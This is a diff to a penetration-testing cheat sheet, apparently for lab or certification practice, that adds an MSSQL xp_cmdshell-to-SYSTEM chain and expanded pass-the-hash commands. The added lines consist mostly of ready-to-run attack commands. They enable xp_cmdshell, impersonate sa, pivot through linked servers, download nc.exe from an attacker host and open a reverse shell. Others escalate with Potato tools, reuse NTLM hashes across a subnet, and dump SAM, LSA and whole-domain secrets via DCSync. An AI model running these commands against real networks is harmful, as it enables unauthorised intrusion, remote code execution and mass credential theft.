@@ -289,13 +289,46 @@ Get-SQLInstanceDomain
 Get-SQLQuery -Instance "{{TARGET_IP}},1433" -query 'Select @@version'
 ```
 ```bash
+# Windows/domain auth:
 impacket-mssqlclient {{DOMAIN_NB}}/{{USERNAME}}@{{TARGET_IP}} -windows-auth
+# SQL-Server login (creds from a connection string / config, e.g. User ID=..;Password=..):
+impacket-mssqlclient <sql_user>:'<sql_pass>'@{{TARGET_IP}}          # SQL auth = default (no -windows-auth)
+crackmapexec mssql {{TARGET_IP}} -u <sql_user> -p '<sql_pass>' --local-auth   # --local-auth = SQL login
+```
+
+**The `xp_cmdshell` → SeImpersonate → SYSTEM chain** (run inside `mssqlclient`):
+
+```sql
+SELECT IS_SRVROLEMEMBER('sysadmin');       -- 1 = you can enable xp_cmdshell directly
+-- enable it (mssqlclient shortcut: just type  enable_xp_cmdshell )
+EXEC sp_configure 'show advanced options',1; RECONFIGURE;
+EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;
+EXEC xp_cmdshell 'whoami';                  -- runs as the SQL service acct (e.g. nt service\mssql$sqlexpress)
+EXEC xp_cmdshell 'whoami /priv';            -- confirm SeImpersonatePrivilege = Enabled
+```
+
+```sql
+-- NOT sysadmin? try impersonating one, then re-check
+EXECUTE AS LOGIN = 'sa'; SELECT IS_SRVROLEMEMBER('sysadmin'); REVERT;
+SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b
+  ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE';   -- who can I impersonate
+-- linked servers (hop to another instance, often the DC):
+EXEC sp_linkedservers;
+EXEC ('SELECT IS_SRVROLEMEMBER(''sysadmin'')') AT [DC01];   -- RPC out to a linked server
+```
+
+Get a real shell off `xp_cmdshell`, catching on the **foothold** (same subnet — Kali can't route in):
+
+```sql
+EXEC xp_cmdshell 'certutil -urlcache -f http://{{LHOST}}/nc.exe C:\Windows\Temp\nc.exe';
+EXEC xp_cmdshell 'C:\Windows\Temp\nc.exe {{LHOST}} {{LPORT}} -e cmd.exe';   -- nc -lvnp {{LPORT}} waiting
 ```
 
 > `xp_cmdshell` runs as the **SQL service account**, which nearly always holds
-> `SeImpersonatePrivilege` → escalate that shell to SYSTEM via a Potato
+> `SeImpersonatePrivilege` → from that shell, drop a Potato (GodPotato/PrintSpoofer) to reach SYSTEM
 > ([`../privilege/windows.md#1732-using-exploits`](../privilege/windows.md#1732-using-exploits)),
-> then dump creds below.
+> then dump creds below. As SYSTEM you're the **`{{COMPUTER_NAME}}$` machine account** — check
+> BloodHound for its rights toward the DC.
 
 ---
 
@@ -343,12 +376,30 @@ $dcom.Document.ActiveView.ExecuteShellCommand("powershell",$null,"powershell -no
 
 ### Pass-the-Hash (NTLM only)
 
+> **Syntax gotcha:** Impacket wants `[domain/]user@target` **in front** and `-hashes LM:NT` — an
+> NT-only hash goes in as `-hashes :<NT>` (empty LM). CME/nxc use `-u user -H <NT>` instead (their own
+> flag style — don't mix the two). Add `--local-auth` when the account is **local** to the box, not domain.
+
 ```bash
-impacket-wmiexec -hashes :{{NTLM_HASH}} Administrator@{{TARGET_IP}}
-crackmapexec smb {{TARGET_IP}} -u Administrator -H {{NTLM_HASH}}
+# code exec / shell on a member box you hold local-admin hash for
+impacket-wmiexec -hashes :{{NTLM_HASH}} Administrator@{{TARGET_IP}}   # also -psexec / -smbexec / -atexec
+evil-winrm -i {{TARGET_IP}} -u Administrator -H {{NTLM_HASH}}          # WinRM PtH (5985 open)
+
+# dump that box's secrets over the wire (SAM local hashes, LSA secrets, cached DCC2 domain creds)
+impacket-secretsdump administrator@{{TARGET_IP}} -hashes :{{NTLM_HASH}}                 # local acct
+impacket-secretsdump {{DOMAIN}}/{{USERNAME}}@{{TARGET_IP}} -hashes :{{NTLM_HASH}}       # domain acct
+impacket-secretsdump {{DOMAIN}}/administrator@{{DC_IP}} -just-dc -hashes :{{NTLM_HASH}} # DA hash → DCSync = whole domain
+
+# validate + sweep with CME / nxc (netexec = the maintained CME successor; identical flags)
+crackmapexec smb {{TARGET_IP}} -u Administrator -H {{NTLM_HASH}} --local-auth
+nxc smb {{SUBNET}} -u Administrator -H {{NTLM_HASH}} --local-auth                        # local-admin reuse sweep
+nxc smb {{DC_IP}} -u {{USERNAME}} -H {{NTLM_HASH}}                                       # domain PtH
+nxc smb {{TARGET_IP}} -u Administrator -H {{NTLM_HASH}} -x whoami                        # -x cmd / -X ps / --sam / --lsa
 ```
 
-> Works for domain accounts + built-in local Administrator (a 2014 update blocks other local admins).
+> Works for **domain accounts** and the **built-in local Administrator (RID 500)** — a 2014 update
+> blocks *other* local admins from remote PtH (RID 500 stays exempt). Local-admin hash reuse across
+> hosts is the highest-yield sweep on internal nets.
 
 ### Overpass-the-Hash (NTLM hash → Kerberos TGT)
 
